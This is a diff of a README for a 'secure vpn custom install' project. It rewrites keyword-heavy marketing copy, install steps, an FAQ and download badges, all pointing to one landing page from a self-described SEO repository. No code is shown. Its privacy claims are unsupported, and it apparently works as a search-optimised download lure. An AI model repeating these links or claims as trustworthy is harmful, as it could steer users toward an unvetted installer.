@@ -1,26 +1,27 @@
 # ⚡ secure vpn custom install
 
-[![Download](https://img.shields.io/badge/Download-Get%20Installer-blue?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-custom-install-landing/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-black?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-custom-install-landing/)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-custom-install-landing/)
+[![Download](https://img.shields.io/badge/Download-Get%20Installer-2ea44f?style=for-the-badge&logo=github)](https://gonbon808.github.io/secure-vpn-custom-install-landing/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-1f6feb?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-custom-install-landing/)
+[![License](https://img.shields.io/badge/License-MIT-black?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-custom-install-landing/)
 
 ## About
 
-**secure vpn custom install** is a clean, repeatable install flow for a **secure vpn** setup that prioritizes **privacy and security focus** without turning the process into a weekend project. It’s built around the basics that actually matter: **AES-256 encryption**, **No-Logs policy**, **Kill Switch**, **Global Servers**, **High speed**, and a **Stable connection**.
+**secure vpn custom install** is a clean install flow for a privacy-first VPN setup: grab the installer, pick your platform, and get connected fast—without weird bundles or noisy steps.
 
-Repo reference (SEO source): https://github.com/gonbon808/secure-vpn-custom-install-seo  
-Main landing + downloads: https://gonbon808.github.io/secure-vpn-custom-install-landing/
+This repo tracks the install landing and documentation for the VPN category, with a focus on getting you to a **stable connection** quickly while keeping a **privacy and security focus**.
+
+- Landing page: https://gonbon808.github.io/secure-vpn-custom-install-landing/  
+- Repository: https://github.com/gonbon808/secure-vpn-custom-install-seo
 
 ## Features
 
-- **AES-256 encryption** end-to-end for traffic protection
-- **No-Logs policy** stance baked into the setup expectations
-- **Kill Switch** support to stop traffic leaks when the tunnel drops
-- **Global Servers** selection for better routing choices
-- **High speed** with sensible defaults (no gimmick toggles)
-- **Stable connection** with quick reconnect behavior
-- **Custom install flow**: predictable steps, minimal prompts, no confusion
-- **Privacy and security focus**: tight defaults, fewer footguns
+- **AES-256 encryption** for traffic protection on untrusted networks
+- **No-Logs policy** posture (privacy-first defaults)
+- **Kill Switch** to block traffic if the tunnel drops
+- **Global Servers** for location flexibility and better routes
+- **High speed** tuning with sensible defaults
+- **Stable connection** behavior under roaming / Wi‑Fi switching
+- Simple install UX: minimal prompts, no clutter
 
 ## System Requirements
 
@@ -28,68 +29,69 @@ Main landing + downloads: https://gonbon808.github.io/secure-vpn-custom-install-
 |---|---|
 | Windows | Windows 10/11 (64-bit) |
 | macOS | macOS 12+ |
-| Linux | Ubuntu 20.04+/Debian 11+/Fedora 36+ (64-bit) |
+| Linux | Ubuntu/Debian/Fedora (x64) |
 | RAM | 2 GB minimum (4 GB recommended) |
-| Storage | 250 MB free |
-| Internet | Any stable connection (VPN performance scales with bandwidth/latency) |
+| Storage | 200 MB free |
+| Internet | Required for sign-in, updates, and server list |
 
 ## Installation
 
-All installers and the current instructions live on the landing page:  
+All downloads and install entry points are published here:  
 https://gonbon808.github.io/secure-vpn-custom-install-landing/
 
 ### Windows
-1. Open the download page: https://gonbon808.github.io/secure-vpn-custom-install-landing/
-2. Download the Windows installer.
-3. Run the installer → accept the prompts.
-4. Launch the app → sign in → pick a server → connect.
-5. Turn on **Kill Switch** in settings before you browse.
+
+1. Open the landing page and click **Download**.
+2. Run the installer (`.exe`).
+3. Approve the network/TAP/TUN prompt if asked.
+4. Launch the app → sign in → choose a server → **Connect**.
+5. (Optional) Enable **Kill Switch** in Settings.
 
 ### macOS
-1. Open the download page: https://gonbon808.github.io/secure-vpn-custom-install-landing/
-2. Download the macOS build.
-3. Install (drag to Applications if provided that way).
-4. Open the app → allow VPN permissions when macOS asks.
-5. Enable **Kill Switch**, then connect to a **Global Servers** location.
+
+1. Open the landing page and click **Download**.
+2. Open the `.dmg` and drag the app into **Applications**.
+3. Launch the app and allow the VPN configuration prompt.
+4. Sign in → pick a region/server → **Connect**.
 
 ### Linux
-1. Open the download page: https://gonbon808.github.io/secure-vpn-custom-install-landing/
-2. Download the Linux package for your distro.
-3. Install using your package tool (deb/rpm as provided on the page).
-4. Start the app → sign in → connect.
-5. Confirm **Kill Switch** is enabled before using public Wi‑Fi.
+
+1. Open the landing page and choose the Linux download.
+2. Install the package for your distro (deb/rpm) or follow the on-page instructions.
+3. Start the client, sign in, then connect to a server.
+4. Verify connectivity and toggle **Kill Switch** if available in your build.
 
 ## Comparison
 
-| Provider | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
+| Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
 |---|---:|:---:|:---:|:---:|:---:|
 | secure vpn custom install | High speed | ✅ | ✅ | ✅ | ✅ |
-| Typical free VPN | Often slow | ❓ | ❌/unclear | ❌ | ❌/limited |
-| Generic “one-click” VPN | Varies | ✅ | ❓ | ✅/varies | ✅/varies |
+| Typical free VPN | Low–Medium | ⚠️ | ❌ | ⚠️ | ⚠️ |
+| Manual OpenVPN/WireGuard setup | Medium–High | ✅ | — | ⚠️ | — |
 
 ## FAQ
 
-**1) Does this support AES-256 encryption?**  
-Yes. The setup is built around **AES-256 encryption** as a baseline expectation.
+**Q: Does this include a Kill Switch?**  
+A: Yes. Enable **Kill Switch** in Settings to block traffic if the VPN drops.
 
-**2) Is there a Kill Switch?**  
-Yes. Enable **Kill Switch** in settings to reduce leak risk if the tunnel drops.
+**Q: What encryption is used?**  
+A: **AES-256 encryption**.
 
-**3) What does “No-Logs policy” mean here?**  
-It means the product position is **No-Logs policy**—you should still read the exact policy text on the landing page before committing.
+**Q: Is there a No-Logs policy?**  
+A: The install is built around a **No-Logs policy** stance and privacy-first defaults.
 
-**4) Will it work on public Wi‑Fi?**  
-Yes. That’s a primary use case. Turn on **Kill Switch** first, then connect.
+**Q: Where do I download the installer?**  
+A: Use the official landing page: https://gonbon808.github.io/secure-vpn-custom-install-landing/
 
 ## Download
 
-Get the latest installer and platform notes here:  
-**https://gonbon808.github.io/secure-vpn-custom-install-landing/**
+**Get secure vpn custom install here:**  
+➡️ https://gonbon808.github.io/secure-vpn-custom-install-landing/
 
 ## Final CTA
 
-[![Download secure vpn custom install](https://img.shields.io/badge/⬇%20Download-secure%20vpn%20custom%20install-blue?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-custom-install-landing/)
-[![Open Landing Page](https://img.shields.io/badge/Open-Landing%20Page-black?style=for-the-badge)](https://gonbon808.github.io/secure-vpn-custom-install-landing/)
-[![View Repo](https://img.shields.io/badge/View-SEO%20Repo-green?style=for-the-badge)](https://github.com/gonbon808/secure-vpn-custom-install-seo)
+[![Get secure vpn custom install](https://img.shields.io/badge/Get%20secure%20vpn%20custom%20install-Download%20Now-2ea44f?style=for-the-badge&logo=download)](https://gonbon808.github.io/secure-vpn-custom-install-landing/)
+[![Open landing page](https://img.shields.io/badge/Open-Landing%20Page-1f6feb?style=for-the-badge&logo=githubpages)](https://gonbon808.github.io/secure-vpn-custom-install-landing/)
+[![View repo](https://img.shields.io/badge/View-Repository-black?style=for-the-badge&logo=github)](https://github.com/gonbon808/secure-vpn-custom-install-seo)
 
-*Install it clean, switch on Kill Switch, and keep your traffic private.*
+*Stay private. Connect fast. Keep control of your traffic.*
